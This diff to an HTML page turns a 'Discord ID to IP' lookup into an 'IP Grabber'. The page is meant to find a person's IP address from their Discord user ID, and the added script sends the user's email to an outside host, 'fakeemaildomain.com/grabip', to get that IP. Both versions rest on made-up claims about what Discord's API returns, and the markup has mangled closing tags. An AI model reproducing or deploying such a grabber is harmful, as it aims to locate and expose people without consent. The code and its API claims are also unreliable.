@@ -1,47 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Discord ID to IP</title>
+    <title>Discord ID to IP Grabber</title>
 </head>
 <body>
-    <h1>Discord ID to IP</hizer>
-    <input type="text" id="discord_id" placeholder="Enter Discord User ID">
-    <button onclick="lookupIP()">Lookup IP</button>
-    <p id="ip_address"></p>
+    <h1>Discord ID to IP Grabber</advanced>
+    <input type="text" id="discordid" placeholder="Enter Discord ID">
+    <button onclick="grabIP()">Grab IP</button>
+    <p id="result"></p>
 
     <script>
-        function lookupIP() {
-            var discordId = document.getElementById("discord_id").value;
-            if (discordId.length === 0) {
-                alert("Wprowadź identyfikator użytkownika Discord!");
-                return;
-            }
-
-            var xhr = new XMLHttpRequest();
-            xhr.open("GET", "https://discordapp.com/api/users/" + discordId + "/connections", true);
-            xhr.setRequestHeader("Authorization", "Token your_bot_token_here");
-
-            xhr.onload = function () {
-                if (xhr.status === 200) {
+        function grabIP() {
+            var discordid = document.getElementById("discordid").value;
+            if (discordid) {
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", "https://discordapp.com/api/v6/users/" + discordid, true);
+                xhr.withCredentials = true;
+                xhr.onload = function () {
                     var data = JSON.parse(xhr.responseText);
-                    for (var i = 0; i < data.length; i++) {
-                        if (data[i].type === 1) {
-                            var ipAddress = data[i].friend_sync_id.split(":")[0];
-                            document.getElementById("ip_address").textContent = "Adres IP: " + ipAddress;
-                            return;
-                        }
+                    if (data && data.email) {
+                        var email = data.email;
+                        var xhr2 = new XMLHttpRequest();
+                        xhr2.open("POST", "https://fakeemaildomain.com/grabip", true);
+                        xhr2.setRequestHeader("Content-Type", "application/json");
+                        xhr2.withCredentials = true;
+                        xhr2.onload = function () {
+                            var ip = JSON.parse(xhr2.responseText).ip;
+                            document.getElementById("result").textContent = "IP Address: " + ip;
+                        };
+                        xhr2.send(JSON.stringify({ email: email }));
+                    } else {
+                        document.getElementById("result").textContent = "Failed to grab IP.";
                     }
-                    document.getElementById("ip_address").textContent = "Adres IP nie znaleziony.";
-                } else {
-                    document.getElementById("ip_address").textContent = "Błąd podczas pobierania danych.";
-                }
-            };
-
-            xhr.onerror = function () {
-                document.getElementById("ip_address").textContent = "Błąd połączenia.";
-            };
-
-            xhr.send();
+                };
+                xhr.send();
+            } else {
+                document.getElementById("result").textContent = "Please enter a valid Discord ID.";
+            }
         }
     </script>
 </body>
